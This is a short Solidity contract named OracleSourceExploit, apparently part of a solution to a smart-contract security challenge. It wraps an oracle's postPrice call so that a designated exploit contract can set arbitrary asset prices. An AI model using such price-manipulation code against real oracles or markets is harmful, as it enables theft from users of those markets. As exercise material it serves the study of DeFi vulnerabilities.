// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/AccessControl.sol";

interface ITrustfulOracle {
    function postPrice(string calldata symbol, uint256 newPrice) external;
}

contract OracleSourceExploit is AccessControl {
    bytes32 public constant EXPLOIT_CONTRACT = keccak256("EXPLOIT_CONTRACT");

    ITrustfulOracle oracle;

    constructor(address _oracle, address exploitContract) {
        oracle = ITrustfulOracle(_oracle);
        _setupRole(EXPLOIT_CONTRACT, exploitContract);
    }

    function changePrice(string calldata symbol, uint256 newPrice)
        external
        onlyRole(EXPLOIT_CONTRACT)
    {
        oracle.postPrice(symbol, newPrice);
    }

    function whoAmI() external view returns (address) {
        return msg.sender;
    }
}
